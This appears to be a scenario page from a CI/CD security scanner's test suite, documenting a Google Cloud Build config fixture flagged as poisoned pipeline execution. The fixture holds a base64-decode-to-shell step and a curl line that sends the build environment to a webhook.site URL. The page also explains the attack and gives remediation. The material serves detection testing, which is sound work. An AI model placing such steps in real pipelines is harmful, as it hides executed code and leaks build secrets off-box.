# Scenario 131: Cloud Build — config contains indicators of malicious activity

**Provider:** Google Cloud Build · **OWASP:** CICD-SEC-4 (Poisoned Pipeline Execution) · **Severity: critical**

**Vulnerable pipeline:** [`cloudbuild.yaml`](cloudbuild.yaml)

## The pattern

```yaml
steps:
  - name: gcr.io/cloud-builders/bash
    args: ['-c', 'echo <base64> | base64 -d | sh']
  - name: gcr.io/cloud-builders/curl
    args: ['https://webhook.site/abcd1234?env=$(env|base64)']
```

The step carries specific compromise **evidence** — a base64-decoded payload
piped to a shell, plus an exfil POST of the build environment to a third-party
webhook. This is the "indicators of malicious activity" class (reverse shells,
base64-exec, miner binaries, Discord/Telegram webhooks, credential-dump pipes,
audit-erasure), distinct from hygiene rules: it's evidence, not a missing
control. The Cloud Build analogue of GHA-027 / GL-025 / BB-025 / ADO-026 /
CC-026.

## How an attacker exploits it

A malicious change — or a compromised builder image — lands the payload, and
every subsequent build executes it with the build's **service-account
identity**, which on GCP often has broad project access. The `base64 -d | sh`
hides the real command from a casual diff; the `webhook.site` POST ships the
build's environment (and any secrets in it) off-box.

## Expected scanner coverage

| Scanner | Detection |
|---------|-----------|
| pipeline-check | `GCB-027` — _Cloud Build config contains indicators of malicious activity_ |

> Defaults to LOW confidence (it's a heuristic on adversary tradecraft);
> `--min-confidence MEDIUM` filters it. Matches inside YAML keys named
> `example` / `fixture` / `sample` / `demo` / `test` are auto-suppressed, so a
> training/CTF repo doesn't false-positive — this fixture's `args` are bare
> lines, so it fires. The base64 here decodes to a harmless `echo` and never
> runs.

## Fix

Treat a real hit as a potential compromise: find the change that added the
step(s), rotate any Secret Manager secrets the build can reach, and audit recent
builds in Cloud Build history. A build should do only what the build does — no
obfuscated execution, no exfil POSTs.

## References

- Google Cloud — Build configuration security: https://cloud.google.com/build/docs/securing-builds/secure-build-best-practices
- MITRE ATT&CK — Ingress tool transfer / exfiltration over web service: https://attack.mitre.org/techniques/T1567/
